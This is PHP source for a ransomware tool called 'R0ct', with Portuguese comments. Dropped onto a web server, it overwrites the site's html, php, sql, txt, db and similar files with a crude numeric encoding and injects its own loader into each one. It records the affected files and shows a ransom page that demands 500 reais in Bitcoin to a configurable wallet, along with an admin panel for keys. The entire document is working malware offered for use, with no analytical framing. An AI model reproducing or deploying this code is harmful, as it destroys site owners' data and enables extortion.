<?php //::__START>R0ct__  

class cof{
	public $Md5Code="298923c8190045e91288b430794814c4"; //code: 1015 altere para um code mais grande
	public $bitcoins="1Aee3e3e3e3e"; // endereço de sua carteira bitcoins
	public $R="500";										// preço do resgate
	public $nkey=5; 											//nao altere.
}

$cof=new cof();
if(isset($_POST["key"])){
	if(isset($_POST["brute_force"])){
		if(isset($_POST["send"])){
			if(empty($_POST["key"])){exit;}
			$key=$_POST["key"];
			$uk=split("::",$key);
			if(empty($uk[1])){exit;}
			if(md5($uk[1])!=$cof->Md5Code){exit;}
			go("1",$uk[0]);
		}
	}
}else{
if(chk_()){if(al()){}}else{if(isset($_GET["admin"])){
	if(isset($_POST["k_key"])){go("","");exit;}else{_makekey();}
	if(isset($_POST["k_password"])){go("","");exit;}else{_makekey();}
}else{header("Location:?admin");exit;}
}}

function _getkey($q){
$cof=new cof();
$l=strlen($q);
for($i=0;$i<$l;$i++){
$x.=floor(ord($q[$i]) / $cof->nkey);
}
return $x;	
}
function desCr($z,$v){
	$cof=new cof();
	$rhj=chr(47).chr(47).chr(95).chr(95).chr(69).chr(78).chr(68).chr(62).chr(82).chr(48).chr(99).chr(116).chr(95).chr(95).chr(58).chr(58).chr(32).chr(63).chr(62);
	//$zhj=chr(60).chr(33).chr(45).chr(45).chr(32).chr(75).chr(114).chr(121).chr(112).chr(116).chr(82).chr(48).chr(99).chr(116).chr(32).chr(45).chr(45).chr(62);
	$r=explode($rhj,$z);
	//$t=str_replace($rhj,"",$r[1]);
	$l=strlen($z);
	$u=split(":",$r[1]);
	for($i=0;$i<$l;$i++){
		$x.=chr($u[$i]/$v);
	}
	return $x;
}
function enCr($z,$v){
	$l=strlen($z);
	for($i=0;$i<$l;$i++){
		$x.=floor(ord($z[$i])*$v).":";
	}
	return $x;
}
function go($d,$pp){
if(isset($_GET["ver"])){
?>
<html>
<head>
<title>confirm</title>
<style>
body{
	background:#000 !important;
}
span{
	color:#26c101;
	font-size:50px;
	font-weight:bold;
	font-family:arial;
}
</style>
</head>
<body>
<center>
<div>
<span>[+] Key -> <?php echo $_POST["k_key"]."::".$_POST["k_password"]; ?></span>
<br />
<span>[+] private -> <?php echo _getkey($_POST["k_key"]); ?></span>
</div>
<br />
<form action=".?admin" method="post" name id class>
<input type="hidden" name="k_key" maxlength="3" id class placeholder="key" value="<?php echo $_POST["k_key"]; ?>";/>
<input type="hidden" name="k_password" id class placeholder="code(1015) mude no script" value="<?php echo $_POST["k_password"]; ?>"/>
<input type="submit" name="sender" id class value="confirmar" />
</form>
</center>
</body>
</html>
<?
exit;
}
$v="cache_r0ct.txt";
if(!isset($_POST["k_password"]) && $d==""){exit;}
if(!isset($_POST["k_key"]) && $d==""){exit;}
if($d==""){
$jkey=$_POST["k_key"];
$jp=$_POST["k_password"];
$gkey=_getkey($jkey);
}else{
$kp=_getkey($pp);
}
if((empty($jkey)) || (empty($jp))){if( $d==""){exit;}}
$h=".";
$dh=opendir($h);
while (false !== ($filename = readdir($dh))) {
    $x[] = $filename;
}
$rqx=array("html","asp","php","htm","txt","pl","sql","db");

$mf=$_SERVER["SCRIPT_FILENAME"];
$_mf=fopen($mf,"r",true);
$_mr=fread($_mf,filesize($mf));
fclose($_mf);
$rhj=chr(47).chr(47).chr(95).chr(95).chr(69).chr(78).chr(68).chr(62).chr(82).chr(48).chr(99).chr(116).chr(95).chr(95).chr(58).chr(58).chr(32).chr(63).chr(62);
$ljm=explode($rhj,$_mr);
$htp=$ljm[0].$rhj;

$gx="";
for($i=2;$i<count($x);$i++){
	$ext=explode(".",strtolower($x[$i]));
	$zext=end($ext);
	if(in_array($zext,$rqx) && $x[$i]!=$v){
		if(filesize($x[$i])>0 && $x[$i]!=$v){
					$qf=fopen($h."/".$x[$i],"r",true);
					$qr=fread($qf,filesize($x[$i]));
					fclose($qf);
						if(empty($d) && $d==""){
							$vCry=enCr($qr,$gkey);
						}else{
							$vCry=desCr($qr,$kp);
						}
					if($d==""){
						$yu=$htp."<!-- KryptR0ct -->".$vCry;
					}else{
						$yu=$vCry;
					}
					$ko=fopen($h."/".$x[$i],"w",true);
					$pk=filesize($x[$i])+filesize($x[$i]);
					fwrite($ko,$yu,$pk);
					fclose($ko);
		}else{
				if(empty($d) && $d==""){
					$wf=fopen($h."/".$x[$i],"w+",true);
					fwrite($wf,$htp,filesize($mf));
					fclose($wf);
				}else{
					$wf=fopen($h."/".$x[$i],"w+",true);
					fwrite($wf,"",0);
					fclose($wf);
				}
			}
		}
			$gx.=$x[$i]." | ";
			$bn=fopen($h."/".$v,"w+",true);
			fwrite($bn,"-==Arquivos Criptografados==-".$gx,filesize($x[$i]));
			fclose($bn);
	}
	
	header("Location:.");
}
function _makekey(){
?>

<!-- -->
<html>
<head>
<title>Admin::R0ct</title>
</head>
<body>
<div>
<span>Admin::R0ct</span>
</div>
<br />
<form action=".?admin&ver" method="post" name="">
<input type="text" name="k_key" maxlength="3" id class value placeholder="key"/>
<input type="text" name="k_password" id class value placeholder="code(1015) mude no script"/>
<input type="submit" name="sender" value="GO" />
</form>
</body>
</html>

<?php
	exit;
}
function al(){
	$h=".";
	$rf="-=================-Arquivos Criptografados-===================-";
	$v="cache_r0ct.txt";
	$ro=fopen($h."/".$v,"r",true);
	if(filesize($h."/".$v)>0){
		$rf=fread($ro,filesize($h."/".$v));
		fclose($ro);
		echo "<script>alert('".$rf."');</script>";
		return true;
	}else{
		return false;
	}
}
function chk_(){
	$h=".";
	$v="cache_r0ct.txt";
	if(file_exists($h."/".$v)){
		return true;
	}else{
		return false;
	}
}
?>


<html>
<head>
<meta charset="utf-8"/>
<title>Acesso negado ::R0ct::</title>
<style>
*{
	margin:0px;
	padding:0px;
}
body{
	
}
a {
	//text-decoration:none;
	color:#FFF !important;
}
#_title>span{
	font-size:30px;
	color:#26c101;
	text-shadow:-1px 0px #000;
	font-weight:bold;
}
#_desc{
	width:325px;
	text-align:center;
	color:#FFF !important;
}
#_desc>span{
	font-size:18px;
	font-family:arial;
}
#pain{
	width:400px;
	border:1px solid #26c101;
	margin-top:50px;
	padding-top:20px;
	padding-bottom:20px;
}
#_top{
	margin-top:50px;//
}
</style>

<script>
//\\?
window.onload=function(){
	//var x=document.getElementsById("__time").InnerHTML=Date();
	//var ax="::R0ct::";
	//alert(ax);
};
</script>
</head>
<body bgcolor="#000">
<div id="_top">
<center>
<div id="_title"><span>R0ct Create By Deffy0h</span></div>
<br />
<div id="_desc"><span><a href="https://pt.wikipedia.org/wiki/Ransomware" target="_blank">Ransomware(R0ct)</a> é um malware ou qualquer software que criptografa os arquivos de um computador ou servidor e para recuperar precisa de uma ajudinha, uma Key de liberação. transfira R$ <?php echo $cof->R; ?> via BitCoins.</span></div>
<!--<div id="__time" class="i"></div><!-- -->
<div id="pain">
<div><img src="http://i.imgur.com/iIIU7WK.png" width="50px" height="50px" /></div>
<div style="magin-top:30px;">
<form action="" method="POST" name="_ES">
<span style="color:#FFF;">Digite a Key:</span>
<br />
<input type="hidden" name="brute_force" />
<input type="text" style="width:300px;text-align:center;" name="key" id="" class="" value="" />
<br />
<br />
<input type="submit" name="send" id="" class="" value="DESCRIPTOGRAFAR" />
</form>
</div>
</div>
<div id="pain" style="margin-top:10px !important;">
<div style="text-align:center;"><span style="color:#26c101;";><?php echo $cof->bitcoins; ?></span></div>
</div>
</center>
</div>
</body>
</html>

<?php exit; //__END>R0ct__:: ?>
